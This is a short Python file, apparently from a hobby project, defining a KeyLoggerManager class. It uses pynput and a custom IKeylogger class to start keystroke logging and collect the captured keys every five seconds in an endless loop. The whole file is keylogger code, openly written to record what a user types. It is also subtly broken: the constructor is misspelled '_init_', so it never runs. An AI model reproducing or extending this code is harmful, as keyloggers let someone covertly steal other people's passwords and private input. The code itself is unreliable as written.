from pynput import keyboard
from time import sleep
import srvus
import encryption
from ny_projet.class_srvice import IKeylogger
import threading


class KeyLoggerManager:
    def _init_(self):
        self.Temporary_list = []
        self.run = IKeylogger()


    def start(self):
        self.run.start_logging()
        while True:
            sleep(5)
            self.Temporary_list.append(self.run.get_logged_keys())
            yield self.Temporary_list
